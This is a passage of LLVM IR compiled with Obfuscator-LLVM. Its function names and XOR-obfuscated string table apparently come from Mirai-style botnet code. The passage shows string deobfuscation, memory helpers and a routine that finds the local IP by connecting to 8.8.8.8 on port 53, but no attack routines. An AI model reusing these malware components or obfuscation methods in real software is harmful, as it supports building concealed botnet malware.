  %64 = load i32, i32* %3, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds i8, i8* %63, i64 %65
  %67 = load i8, i8* %66, align 1
  %68 = sext i8 %67 to i32
  %69 = xor i32 %68, %60
  %70 = trunc i32 %69 to i8
  store i8 %70, i8* %66, align 1
  %71 = load i8, i8* %8, align 1
  %72 = zext i8 %71 to i32
  %73 = load %struct.table_value*, %struct.table_value** %4, align 8
  %74 = getelementptr inbounds %struct.table_value, %struct.table_value* %73, i32 0, i32 0
  %75 = load i8*, i8** %74, align 8
  %76 = load i32, i32* %3, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds i8, i8* %75, i64 %77
  %79 = load i8, i8* %78, align 1
  %80 = sext i8 %79 to i32
  %81 = xor i32 %80, %72
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %78, align 1
  br label %83

; <label>:83:                                     ; preds = %34
  %84 = load i32, i32* %3, align 4
  %85 = add nsw i32 %84, 1
  store i32 %85, i32* %3, align 4
  br label %27

; <label>:86:                                     ; preds = %27
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @table_lock_val(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [8 x %struct.table_value], [8 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i8* @table_retrieve_val(i32, i32*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32*, align 8
  %5 = alloca %struct.table_value*, align 8
  store i32 %0, i32* %3, align 4
  store i32* %1, i32** %4, align 8
  %6 = load i32, i32* %3, align 4
  %7 = sext i32 %6 to i64
  %8 = getelementptr inbounds [8 x %struct.table_value], [8 x %struct.table_value]* @table, i64 0, i64 %7
  store %struct.table_value* %8, %struct.table_value** %5, align 8
  %9 = load i32*, i32** %4, align 8
  %10 = icmp ne i32* %9, null
  br i1 %10, label %11, label %17

; <label>:11:                                     ; preds = %2
  %12 = load %struct.table_value*, %struct.table_value** %5, align 8
  %13 = getelementptr inbounds %struct.table_value, %struct.table_value* %12, i32 0, i32 1
  %14 = load i16, i16* %13, align 8
  %15 = zext i16 %14 to i32
  %16 = load i32*, i32** %4, align 8
  store i32 %15, i32* %16, align 4
  br label %17

; <label>:17:                                     ; preds = %11, %2
  %18 = load %struct.table_value*, %struct.table_value** %5, align 8
  %19 = getelementptr inbounds %struct.table_value, %struct.table_value* %18, i32 0, i32 0
  %20 = load i8*, i8** %19, align 8
  ret i8* %20
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_strlen(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %3, align 4
  br label %4

; <label>:4:                                      ; preds = %10, %1
  %5 = load i8*, i8** %2, align 8
  %6 = getelementptr inbounds i8, i8* %5, i32 1
  store i8* %6, i8** %2, align 8
  %7 = load i8, i8* %5, align 1
  %8 = sext i8 %7 to i32
  %9 = icmp ne i32 %8, 0
  br i1 %9, label %10, label %13

; <label>:10:                                     ; preds = %4
  %11 = load i32, i32* %3, align 4
  %12 = add nsw i32 %11, 1
  store i32 %12, i32* %3, align 4
  br label %4

; <label>:13:                                     ; preds = %4
  %14 = load i32, i32* %3, align 4
  ret i32 %14
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_strcpy(i8*, i8*) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = call i32 @util_strlen(i8* %6)
  store i32 %7, i32* %5, align 4
  %8 = load i8*, i8** %3, align 8
  %9 = load i8*, i8** %4, align 8
  %10 = load i32, i32* %5, align 4
  %11 = add nsw i32 %10, 1
  call void @util_memcpy(i8* %8, i8* %9, i32 %11)
  %12 = load i32, i32* %5, align 4
  ret i32 %12
}

; Function Attrs: noinline nounwind uwtable
define void @util_memcpy(i8*, i8*, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  store i32 %2, i32* %6, align 4
  %9 = load i8*, i8** %4, align 8
  store i8* %9, i8** %7, align 8
  %10 = load i8*, i8** %5, align 8
  store i8* %10, i8** %8, align 8
  br label %11

; <label>:11:                                     ; preds = %15, %3
  %12 = load i32, i32* %6, align 4
  %13 = add nsw i32 %12, -1
  store i32 %13, i32* %6, align 4
  %14 = icmp ne i32 %12, 0
  br i1 %14, label %15, label %21

; <label>:15:                                     ; preds = %11
  %16 = load i8*, i8** %8, align 8
  %17 = getelementptr inbounds i8, i8* %16, i32 1
  store i8* %17, i8** %8, align 8
  %18 = load i8, i8* %16, align 1
  %19 = load i8*, i8** %7, align 8
  %20 = getelementptr inbounds i8, i8* %19, i32 1
  store i8* %20, i8** %7, align 8
  store i8 %18, i8* %19, align 1
  br label %11

; <label>:21:                                     ; preds = %11
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @util_zero(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  %6 = load i8*, i8** %3, align 8
  store i8* %6, i8** %5, align 8
  br label %7

; <label>:7:                                      ; preds = %11, %2
  %8 = load i32, i32* %4, align 4
  %9 = add nsw i32 %8, -1
  store i32 %9, i32* %4, align 4
  %10 = icmp ne i32 %8, 0
  br i1 %10, label %11, label %14

; <label>:11:                                     ; preds = %7
  %12 = load i8*, i8** %5, align 8
  %13 = getelementptr inbounds i8, i8* %12, i32 1
  store i8* %13, i8** %5, align 8
  store i8 0, i8* %12, align 1
  br label %7

; <label>:14:                                     ; preds = %7
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_local_addr() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  %5 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %6 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 0, i32* %2, align 4
  store i32 16, i32* %4, align 4
  %7 = call i32* @__errno_location() #9
  store i32 0, i32* %7, align 4
  %8 = call i32 @socket(i32 2, i32 2, i32 0) #6
  store i32 %8, i32* %2, align 4
  %9 = icmp eq i32 %8, -1
  br i1 %9, label %10, label %11

; <label>:10:                                     ; preds = %0
  store i32 0, i32* %1, align 4
  br label %35

; <label>:11:                                     ; preds = %0
  %12 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %12, align 4
  %13 = call i32 @htonl(i32 134744072) #9
  %14 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %15 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %14, i32 0, i32 0
  store i32 %13, i32* %15, align 4
  %16 = call zeroext i16 @htons(i16 zeroext 53) #9
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %16, i16* %17, align 2
  %18 = load i32, i32* %2, align 4
  %19 = bitcast %union.__CONST_SOCKADDR_ARG* %5 to %struct.sockaddr**
  %20 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  store %struct.sockaddr* %20, %struct.sockaddr** %19, align 8
  %21 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %5, i32 0, i32 0
  %22 = load %struct.sockaddr*, %struct.sockaddr** %21, align 8
  %23 = call i32 @connect(i32 %18, %struct.sockaddr* %22, i32 16)
  %24 = load i32, i32* %2, align 4
  %25 = bitcast %union.__CONST_SOCKADDR_ARG* %6 to %struct.sockaddr**
  %26 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  store %struct.sockaddr* %26, %struct.sockaddr** %25, align 8
  %27 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %6, i32 0, i32 0
  %28 = load %struct.sockaddr*, %struct.sockaddr** %27, align 8
  %29 = call i32 @getsockname(i32 %24, %struct.sockaddr* %28, i32* %4) #6
  %30 = load i32, i32* %2, align 4
  %31 = call i32 @close(i32 %30)
  %32 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %33 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %32, i32 0, i32 0
  %34 = load i32, i32* %33, align 4
  store i32 %34, i32* %1, align 4
  br label %35

; <label>:35:                                     ; preds = %11, %10
  %36 = load i32, i32* %1, align 4
  ret i32 %36
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) #2

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { argmemonly nounwind }
attributes #4 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { nounwind }
attributes #7 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { nounwind readnone }
attributes #10 = { nounwind readonly }
attributes #11 = { noreturn }
attributes #12 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0, !0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146836174}
!2 = !{i32 -2146835765}
!3 = !{i32 -2146836302}
!4 = !{i32 -2146835893}
